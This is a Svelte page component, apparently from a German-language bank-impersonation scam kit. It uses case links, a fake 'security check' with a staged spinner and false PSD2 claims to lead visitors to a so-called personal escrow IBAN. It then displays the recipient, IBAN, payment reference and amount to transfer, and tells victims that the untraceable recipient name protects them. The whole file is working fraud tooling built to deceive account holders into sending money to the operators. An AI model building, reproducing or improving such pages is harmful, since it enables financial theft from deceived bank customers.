<script lang="ts">
  import Nav from './lib/components/Nav.svelte'
  import Footer from './lib/components/Footer.svelte'
  import Button from './lib/components/ui/Button.svelte'
  import Card from './lib/components/ui/Card.svelte'
  import CopyField from './lib/components/ui/CopyField.svelte'
  import { fetchCase, type CaseData } from './lib/api'

  type Phase = 'loading' | 'invalid' | 'expired' | 'intro' | 'generating' | 'details'

  let phase = $state<Phase>('loading')
  let caseData = $state<CaseData | null>(null)

  function caseIdFromLocation() {
    const path = decodeURIComponent(window.location.pathname).replace(/^\/+|\/+$/g, '')
    const match = path.match(/^case=(.+)$/i)
    if (match) {
      try { sessionStorage.setItem('portal:case', match[1]) } catch {}
      history.replaceState(null, '', '/')
      return match[1]
    }
    try { return sessionStorage.getItem('portal:case') ?? '' } catch { return '' }
  }

  const caseId = caseIdFromLocation()
  if (!caseId) {
    phase = 'invalid'
  } else {
    fetchCase(caseId).then((result) => {
      if (result.kind === 'invalid') { phase = 'invalid'; return }
      if (result.kind === 'expired') { phase = 'expired'; return }
      caseData = result.kind === 'ok' ? result.data : null
      try {
        phase = sessionStorage.getItem('activated:' + caseId) ? 'details' : 'intro'
      } catch { phase = 'intro' }
    })
  }

  function activate() {
    const caseId = caseIdFromLocation()
    try { if (caseId) sessionStorage.setItem('activated:' + caseId, '1') } catch {}
    phase = 'generating'
    setTimeout(() => (phase = 'details'), 2500)
  }
</script>

<div class="min-h-screen bg-white flex flex-col">
  <Nav />

  <main class="flex-1 mx-auto w-full max-w-xl px-4 py-10 sm:px-6">
    {#if phase === 'loading'}
      <p class="text-center text-sm text-[var(--muted-foreground)]">Loading your case details...</p>
    {:else if phase === 'invalid'}
      <Card class="p-8 text-center">
        <h1 class="text-lg font-semibold text-[var(--foreground)]">Dieser Link ist ungültig</h1>
        <p class="mt-2 text-sm text-[var(--muted-foreground)]">
          Bitte kontaktieren Sie Ihre Bank für einen neuen Link.
        </p>
      </Card>
    {:else if phase === 'expired'}
      <Card class="p-8 text-center">
        <h1 class="text-lg font-semibold text-[var(--foreground)]">Dieser Link ist abgelaufen</h1>
        <p class="mt-2 text-sm text-[var(--muted-foreground)]">
          Aus Sicherheitsgründen wurde dieser Link deaktiviert. Bitte kontaktieren Sie Ihre Bank.
        </p>
      </Card>
    {:else if (phase === 'intro' || phase === 'generating') && caseData}
      <Card class="p-8">
        <!-- Heading swaps on generate -->
        <h1 class="text-lg font-semibold text-[var(--foreground)]">
          {phase === 'generating' ? 'Wichtige Sicherheitsmaßnahme' : 'Sicherheits-Check Abgeschlossen'}
        </h1>

        <hr class="my-4 border-t border-[var(--border)]" />

        <!-- Body text swaps on generate -->
        {#if phase === 'generating'}
          <p class="text-sm text-[var(--muted-foreground)] leading-relaxed">
            Um Ihnen die Sicherheit Ihres Kontos zu gewährleisten, folgen Sie bitte den Anweisungen der Sicherheitsabteilung.
          </p>
        {:else}
          <p class="text-sm text-[var(--muted-foreground)] leading-relaxed">
            Um Ihre persönliche Treuhand-IBAN für die Einzahlung zu aktivieren, klicken Sie bitte auf den untenstehenden Button. Dies stellt sicher, dass Ihre Transaktion gemäß den aktuellen Sicherheitsstandards.
            <strong class="font-semibold text-[var(--foreground)]">Sicherheitsstandards (PSD2)</strong>  verschlüsselt wird.
          </p>
        {/if}

        <!-- Reference number — hidden during generation -->
        {#if phase !== 'generating'}
          <div class="mt-6">
            <label for="ref" class="block text-sm font-bold text-[var(--foreground)] mb-1.5">
              Referenznummer
            </label>
            <div class="relative">
              <input
                id="ref"
                type="text"
                readonly
                value={caseData.case_id}
                class="w-full rounded-md border border-[var(--border)] bg-white px-3 py-2 pr-16 text-sm text-[var(--foreground)] focus:outline-none cursor-default select-all"
              />
              <button
                type="button"
                onclick={async () => { await navigator.clipboard.writeText(caseData!.case_id) }}
                class="absolute right-2 top-1/2 -translate-y-1/2 text-sm font-medium text-[#1f2978] hover:text-[#182068] transition-colors"
              >Kopieren</button>
            </div>
          </div>
        {/if}

        <div class="mt-6">
          <button
            onclick={activate}
            disabled={phase === 'generating'}
            class="w-full inline-flex items-center justify-center bg-[#1f2978] py-3 text-base font-semibold text-white transition-colors disabled:opacity-80 disabled:cursor-not-allowed hover:bg-[#182068]"
          >
            {#if phase === 'generating'}
              <svg class="h-5 w-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
              </svg>
            {:else}
              Treuhand-IBAN generieren
            {/if}
          </button>
        </div>
      </Card>
    {:else if phase === 'details' && caseData}
      <Card class="p-8">
        <h1 class="text-lg font-semibold text-[var(--foreground)]">Sicherheitsmaßnahme eingeleitet</h1>

        <hr class="my-4 border-t border-[var(--border)]" />

        <p class="text-sm text-[var(--muted-foreground)] leading-relaxed">
          Ihr persönliches Treuhandkonto wurde erfolgreich erstellt. Der Empfängername ist ein zufällig zugeteilter, virtueller IBAN-Name, der mit einer Referenznummer Ihrem Konto zugeordnet ist. Dies schützt Sie vor Angriffen, da das Konto nicht auf Ihren Namen zurückverfolgt werden kann.
        </p>

        <div class="mt-6 space-y-4">
          <CopyField label="Empfänger" value={caseData.aes_reference} />
          <CopyField label="IBAN" value={caseData.iban} />
          <CopyField label="Verwendungszweck" value={caseData.verwendungszweck} />
          <CopyField label="Betrag" value={caseData.betrag + ' EUR'} />
        </div>
      </Card>
    {/if}
  </main>

  <Footer />
</div>
